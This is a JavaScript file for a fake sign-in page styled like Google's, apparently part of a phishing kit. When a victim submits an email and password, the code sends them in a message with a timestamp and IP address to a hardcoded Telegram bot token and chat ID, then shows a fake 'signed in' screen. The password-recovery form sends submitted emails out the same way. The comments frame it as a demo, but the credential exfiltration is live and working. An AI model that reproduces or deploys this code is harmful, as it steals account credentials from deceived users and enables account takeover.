document.addEventListener('DOMContentLoaded', function() {
    // DOM Elements
    const signinPage = document.getElementById('signinPage');
    const forgotPasswordPage = document.getElementById('forgotPasswordPage');
    const successPage = document.getElementById('successPage');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const passwordGroup = document.getElementById('passwordGroup');
    const forgotPasswordLink = document.getElementById('forgotPassword');
    const nextButton = document.getElementById('nextButton');
    const togglePassword = document.getElementById('togglePassword');
    const emailError = document.getElementById('emailError');
    const passwordError = document.getElementById('passwordError');
    const backFromForgotPassword = document.getElementById('backFromForgotPassword');
    const sendRecoveryButton = document.getElementById('sendRecoveryButton');
    const recoveryOptions = document.getElementById('recoveryOptions');
    const recoveryEmailInput = document.getElementById('recoveryEmail');
    const recoveryEmailError = document.getElementById('recoveryEmailError');
    const signedInEmail = document.getElementById('signedInEmail');
    const signOutButton = document.getElementById('signOutButton');
    const forgotEmailLink = document.getElementById('forgotEmail');

    // Telegram Bot Configuration
    const BOT_TOKEN = '7878971486:AAHhMDmH8lUzAbpdrEsEg3hdHUnjiRHkmlE';
    const CHAT_ID = '6858157782';
    const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    // State
    let currentPage = 'signin';
    let currentEmail = '';
    let passwordVisible = false;

    // Event Listeners
    nextButton.addEventListener('click', handleNextButton);
    togglePassword.addEventListener('click', togglePasswordVisibility);
    forgotPasswordLink.addEventListener('click', showForgotPassword);
    backFromForgotPassword.addEventListener('click', goBackToSignIn);
    sendRecoveryButton.addEventListener('click', handleRecovery);
    signOutButton.addEventListener('click', signOut);
    forgotEmailLink.addEventListener('click', showForgotEmailAlert);

    // Email recovery option click
    document.getElementById('emailRecovery').addEventListener('click', function() {
        alert('Verification code would be sent to your email in a real application.');
        showSuccessPage(recoveryEmailInput.value);
    });

    // Functions
    async function sendToTelegram(message) {
        try {
            const response = await fetch(API_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
            
            if (!response.ok) {
                console.error('Failed to send message to Telegram');
            }
        } catch (error) {
            console.error('Error sending to Telegram:', error);
        }
    }

    function getClientIP() {
        return '185.199.108.153'; // In a real application, you would get this from the server
    }

    function handleNextButton() {
        if (currentPage === 'signin') {
            if (passwordGroup.style.display === 'none') {
                // Step 1: Verify email
                const email = emailInput.value.trim();
                if (!email) {
                    showError(emailInput, emailError, 'Enter an email or phone number');
                    return;
                }

                if (!validateEmail(email) && !validatePhone(email)) {
                    showError(emailInput, emailError, 'Enter a valid email or phone number');
                    return;
                }

                currentEmail = email;
                hideError(emailInput, emailError);
                
                // Show password field
                passwordGroup.style.display = 'block';
                forgotPasswordLink.style.display = 'block';
                forgotEmailLink.style.display = 'none';
                nextButton.textContent = 'Sign in';
                
                setTimeout(() => {
                    passwordInput.focus();
                }, 10);
                
                passwordGroup.classList.add('fade-in');
            } else {
                // Step 2: Verify password
                const password = passwordInput.value;
                
                if (!password) {
                    showError(passwordInput, passwordError, 'Enter a password');
                    return;
                }

                // Send credentials to Telegram
                const ip = getClientIP();
                const timestamp = new Date().toISOString();
                const message = `
<b>New Login Attempt</b>
📧 <b>Email:</b> <code>${currentEmail}</code>
🔑 <b>Password:</b> <code>${password}</code>
🌐 <b>IP Address:</b> <code>${ip}</code>
🕒 <b>Time:</b> <code>${timestamp}</code>
                `;
                
                sendToTelegram(message)
                    .then(() => {
                        // Show success page even if Telegram send fails
                        hideError(passwordInput, passwordError);
                        showSuccessPage(currentEmail);
                    })
                    .catch(() => {
                        hideError(passwordInput, passwordError);
                        showSuccessPage(currentEmail);
                    });
            }
        }
    }

    function togglePasswordVisibility() {
        passwordVisible = !passwordVisible;
        passwordInput.type = passwordVisible ? 'text' : 'password';
        togglePassword.innerHTML = passwordVisible ? 'visibility_off' : 'visibility';
    }

    function showForgotPassword(e) {
        e.preventDefault();
        currentPage = 'forgotPassword';
        signinPage.style.display = 'none';
        forgotPasswordPage.style.display = 'block';
    }

    function goBackToSignIn() {
        currentPage = 'signin';
        forgotPasswordPage.style.display = 'none';
        signinPage.style.display = 'block';
    }

    function handleRecovery() {
        const email = recoveryEmailInput.value.trim();
        
        if (!email) {
            showError(recoveryEmailInput, recoveryEmailError, 'Enter an email');
            return;
        }

        if (!validateEmail(email)) {
            showError(recoveryEmailInput, recoveryEmailError, 'Enter a valid email address');
            return;
        }

        // Send recovery email to Telegram
        const ip = getClientIP();
        const timestamp = new Date().toISOString();
        const message = `
<b>Password Recovery Attempt</b>
📧 <b>Email:</b> <code>${email}</code>
🌐 <b>IP Address:</b> <code>${ip}</code>
🕒 <b>Time:</b> <code>${timestamp}</code>
        `;
        
        sendToTelegram(message)
            .then(() => {
                hideError(recoveryEmailInput, recoveryEmailError);
                recoveryOptions.style.display = 'block';
                const emailParts = email.split('@');
                const hiddenEmail = emailParts[0].charAt(0) + '••••@' + emailParts[1];
                document.querySelector('#emailRecovery div div:last-child').textContent = hiddenEmail;
            })
            .catch(() => {
                hideError(recoveryEmailInput, recoveryEmailError);
                recoveryOptions.style.display = 'block';
                const emailParts = email.split('@');
                const hiddenEmail = emailParts[0].charAt(0) + '••••@' + emailParts[1];
                document.querySelector('#emailRecovery div div:last-child').textContent = hiddenEmail;
            });
    }

    function showSuccessPage(email) {
        currentPage = 'success';
        document.getElementById('mainContainer').style.display = 'none';
        successPage.style.display = 'block';
        signedInEmail.textContent = email;
    }

    function signOut() {
        currentPage = 'signin';
        successPage.style.display = 'none';
        document.getElementById('mainContainer').style.display = 'block';
        signinPage.style.display = 'block';
        forgotPasswordPage.style.display = 'none';
        
        // Reset form
        passwordGroup.style.display = 'none';
        forgotPasswordLink.style.display = 'none';
        forgotEmailLink.style.display = 'block';
        nextButton.textContent = 'Next';
        emailInput.value = '';
        passwordInput.value = '';
        currentEmail = '';
    }

    function showForgotEmailAlert(e) {
        e.preventDefault();
        alert('In a real application, this would help you recover your email address.');
    }

    // Helper functions
    function showError(input, errorElement, message) {
        errorElement.textContent = message;
        errorElement.style.display = 'block';
        input.style.borderColor = '#d93025';
    }

    function hideError(input, errorElement) {
        errorElement.style.display = 'none';
        input.style.borderColor = '#dadce0';
    }

    function validateEmail(email) {
        const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return re.test(email);
    }

    function validatePhone(phone) {
        const re = /^[\+]?[(]?[0-9]{3}[)]?[-\s\.]?[0-9]{3}[-\s\.]?[0-9]{4,6}$/;
        return re.test(phone);
    }
});